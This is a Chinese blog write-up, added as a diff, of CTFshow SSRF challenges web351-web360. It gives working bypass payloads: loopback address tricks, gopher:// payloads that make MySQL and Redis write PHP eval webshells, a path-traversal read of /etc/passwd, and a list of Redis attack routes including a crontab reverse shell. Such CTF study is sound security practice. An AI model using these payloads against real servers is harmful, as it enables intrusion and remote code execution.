@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="SSRF  web351-web360       写在前面：ssrf常见的一些函数 12345678curl_init()：初始curl会话curl_setopt()：会话设置curl_close()：会话关闭file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。readfile()：输出一个文件的内容。fsockop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF-CTFshow">
+<meta property="og:url" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/index.html">
+<meta property="og:site_name" content="晴川&#39;s Blog">
+<meta property="og:description" content="SSRF  web351-web360       写在前面：ssrf常见的一些函数 12345678curl_init()：初始curl会话curl_setopt()：会话设置curl_close()：会话关闭file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。readfile()：输出一个文件的内容。fsockop">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20230711213538810.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20230711213337033.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712182723167.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712181653959.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190451055.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/cc15c26e93dfaac450eaa31c71c8d40a.jpeg">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190638172.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712195039783.png">
+<meta property="og:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712201519214.png">
+<meta property="article:published_time" content="2023-07-22T07:43:43.000Z">
+<meta property="article:modified_time" content="2023-11-11T10:23:14.039Z">
+<meta property="article:author" content="Qingchuan">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20230711213538810.png"><title>SSRF-CTFshow | 晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/2023/07/22/SSRF%20%20web351-/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">SSRF-CTFshow</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-11</span></span></div></header><div class="post-body"><h1 id><a href="#" class="headerlink" title></a></h1>
+        <h1 id="SSRF-web351-web360">
+          <a href="#SSRF-web351-web360" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF-web351-web360" class="headerlink" title="SSRF  web351-web360"></a>SSRF  web351-web360</h1>
+      <p>写在前面：ssrf常见的一些函数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl_init()：初始curl会话</span><br><span class="line">curl_setopt()：会话设置</span><br><span class="line">curl_close()：会话关闭</span><br><span class="line">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</span><br><span class="line">readfile()：输出一个文件的内容。</span><br><span class="line">fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</span><br><span class="line">curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</span><br><span class="line">fopen()：打开一个文件文件或者 URL。</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="web351">
+          <a href="#web351" class="heading-link"><i class="fas fa-link"></i></a><a href="#web351" class="headerlink" title="web351"></a>web351</h2>
+      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="web352">
+          <a href="#web352" class="heading-link"><i class="fas fa-link"></i></a><a href="#web352" class="headerlink" title="web352"></a>web352</h2>
+      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="web353">
+          <a href="#web353" class="heading-link"><i class="fas fa-link"></i></a><a href="#web353" class="headerlink" title="web353"></a>web353</h2>
+      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>parse_url()解析请求包的参数，返回数组，scheme是请求包的协议</p>
+<p>127.1会被解析成127.0.0.1，也就意味着为零可缺省<br>在Linux中，0也会被解析成127.0.0.1<br>127.0.0.0&#x2F;8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost<br>ip地址还可以通过表示成其他进制的形式访问，IP地址二进制、十进制、十六进制互换</p>
+
+        <h2 id="web354">
+          <a href="#web354" class="heading-link"><i class="fas fa-link"></i></a><a href="#web354" class="headerlink" title="web354"></a>web354</h2>
+      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="web355">
+          <a href="#web355" class="heading-link"><i class="fas fa-link"></i></a><a href="#web355" class="headerlink" title="web355"></a>web355</h2>
+      <p>这题限制了<code>http://[host]/[path]</code> host部分长度小于5</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></div></figure>
+
+<p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="web356">
+          <a href="#web356" class="heading-link"><i class="fas fa-link"></i></a><a href="#web356" class="headerlink" title="web356"></a>web356</h2>
+      <p>host长度要小于3</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></div></figure>
+
+<p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="web357">
+          <a href="#web357" class="heading-link"><i class="fas fa-link"></i></a><a href="#web357" class="headerlink" title="web357"></a>web357</h2>
+      
+        <h2 id="web358">
+          <a href="#web358" class="heading-link"><i class="fas fa-link"></i></a><a href="#web358" class="headerlink" title="web358"></a>web358</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>这段代码使用了正则表达式来定义条件，具体条件如下：</p>
+<ul>
+<li><code>^</code>：表示匹配字符串的开始位置。</li>
+<li><code>http://ctf\.</code>：表示以 “<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://ctf/">http://ctf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.” 开头。其中，<code>.</code> 是正则表达式中的特殊字符，需要使用 <code>\</code> 进行转义。</li>
+<li><code>.*</code>：表示匹配任意字符（除换行符外）的零个或多个实例。</li>
+<li><code>show$</code>：表示以 “show” 结尾。</li>
+<li><code>/i</code>：表示不区分大小写。</li>
+</ul>
+<p>综合起来，这个正则表达式的意思是判断给定的 URL 是否以 “<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://ctf/">http://ctf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.” 开头，以 “show” 结尾，并且不区分大小写。</p>
+<p>如果传入的 URL 满足上述条件，就会执行 <code>echo file_get_contents($url);</code> 的代码，使用 <code>file_get_contents()</code> 函数获取该 URL 的内容，并将其输出到页面上</p>
+<p>想要做的输出flag.php无法作到在flag.PHP后面直接加show，加一个传参的形式即可</p>
+<p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="web359">
+          <a href="#web359" class="heading-link"><i class="fas fa-link"></i></a><a href="#web359" class="headerlink" title="web359"></a>web359</h2>
+      <p>用到工具<strong>利用gopher协议无密码注入mysql</strong>，使用<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus工具</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>构造payload</p>
+<p>python gopherus.py  –exploit mysql</p>
+<ul>
+<li>选择构建mysql的payload</li>
+<li>设置用户名，默认root</li>
+<li>sql注入，写入shell，这里<strong>使用了into outfile新建shell并写入</strong></li>
+<li>得到payload</li>
+</ul>
+<p>登陆界面找到一个隐藏的攻击点，对其进行SSRF攻击</p>
+<p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213538810.png"></p>
+<p>将生成的gopher链接作为returl的参数，因为<code>_</code>后面的内容或经过两次url提交，所以需要再urlencode一次：（记得只编码下划线后面的，否则容易出错）</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%20%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%27%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2520%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2561%255d%2529%253b%253f%253e%2527%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2561%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></div></figure>
+
+<p> select ‘<?php eval($_POST[cmd]);?>‘into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cmd.php’;</p>
+<p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213337033.png"></p>
+
+        <h2 id="web360">
+          <a href="#web360" class="heading-link"><i class="fas fa-link"></i></a><a href="#web360" class="headerlink" title="web360"></a>web360</h2>
+      <p>ssrf打Redis</p>
+<p>写webshell</p>
+<p>写ssh公钥</p>
+<p>写contrab计划反弹shell</p>
+<p>主从复制</p>
+<p>这个题目上一题差不多，上一题打MySQL这一题打Redis</p>
+<blockquote>
+<p>什么是Redis未授权访问？</p>
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器</p>
+<p>简单说，漏洞的产生条件有以下两点：redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网<br>没有设置密码认证（一般为空），可以免密码远程登录redis服务</p>
+</blockquote>
+<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712182723167.png"></p>
+<p>若出现报错，则说明存在redis服务</p>
+<p>用工具做</p>
+<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712181653959.png"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="补充">
+          <a href="#补充" class="heading-link"><i class="fas fa-link"></i></a><a href="#补充" class="headerlink" title="补充"></a>补充</h2>
+      <p>###其他绕过127的方法</p>
+<p>1.如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com">http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com</a> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.evil.com/">http://www.evil.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>2.<a href="http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php</a> 像这样的网址还有 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>3.短网址目前基本都需要登录使用，如缩我，<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://4m.cn/">https://4m.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>4.各种指向127.0.0.1的地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/         # localhost就是代指127.0.0.1</span><br><span class="line">http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</span><br><span class="line">http://[::]:80/           # 在liunx下可用，window测试了下不行</span><br><span class="line">http://127。0。0。1/       # 用中文句号绕过</span><br><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></div></figure>
+
+<p>利用不存在的协议头绕过指定的协议头</p>
+<p>file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// ssrf.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(!preg_match(&#x27;/^https/is&#x27;,$_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">die(&quot;no hack&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents($_GET[&#x27;url&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpsssss://</span><br></pre></td></tr></table></div></figure>
+
+<p>此时file_get_contents()函数遇到了不认识的伪协议头“httpsssss:&#x2F;&#x2F;”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p>
+<figure class="highlight basic"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=httpsssss://../../../../../../etc/passwd</span><br></pre></td></tr></table></div></figure>
+
+<p>###URL解析差异</p>
+<p>1.readfile和parse_user函数解析差异绕过指定端口</p>
